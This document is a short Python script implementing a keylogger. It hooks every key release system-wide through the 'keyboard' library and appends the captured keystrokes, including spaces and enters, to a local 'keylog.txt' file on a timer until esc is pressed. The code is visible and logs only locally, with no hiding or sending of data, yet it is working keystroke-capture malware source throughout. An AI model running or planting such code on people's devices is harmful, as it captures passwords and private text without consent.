import keyboard
from threading import Timer

INTERVAL = 2

class Keylogger:


    def __init__(self, interval):
        """
        Initialize Keylogger class variables
        """
        self.interval = interval #set interval at which log dumps to file
        self.log = "" #initialize empty log
        self.timer = Timer(self.interval, self.report)
        self.timer_alive = 0

    def record_press(self, event):
        """
        Records keypress and translates space and some punctuation keys into the key
        meaning.
        """
        key = event.name
        # if enter or space are entered, then write entire word to file
        if key == "space" or key == "enter":
            if key == "space":
                key = " [space]"
            else:
                key = " [enter]"

            self.log += key # append the key to self log
            self.report() # Whole words get printed to log

        else:
            self.log += key # append the key to self log
            if self.timer_alive == 1:
                self.timer.cancel()
                self.timer_alive = 0
            self.timer = Timer(self.interval, self.report)
            self.timer.start()
            self.timer_alive = 1


    def write_to_file(self):
        """
        This method creates a log file in the current directory and
        appends the self.log to it.
        """
        # open (or create) the file in append mode
        with open("keylog.txt", "a") as f:
            # write the self.log to the end of the file
            print(self.log, file=f)
        print(f"     (Keylog written)")
        #cancel any timer to avoid split words
        self.timer.cancel()
        self.timer_alive = 0


    def report(self):
        """
        If log has data, then write it to file and then clear log
        """
        if self.log:
            self.write_to_file()

        self.log = ""



    def start(self):
        """
        Start keyboard listener and keeps it running until ctrl + c is pressed
        """
        keyboard.on_release(self.record_press) # starts record_press() when true
        keyboard.wait(hotkey="esc") # The wait() keeps the listener active



if __name__ == "__main__":
    """
    Initialize Keylogger instance and enter start loop
    """

    keylogger = Keylogger(INTERVAL) #Interval is in seconds
    print(f"Press esc to quit")
    keylogger.start()
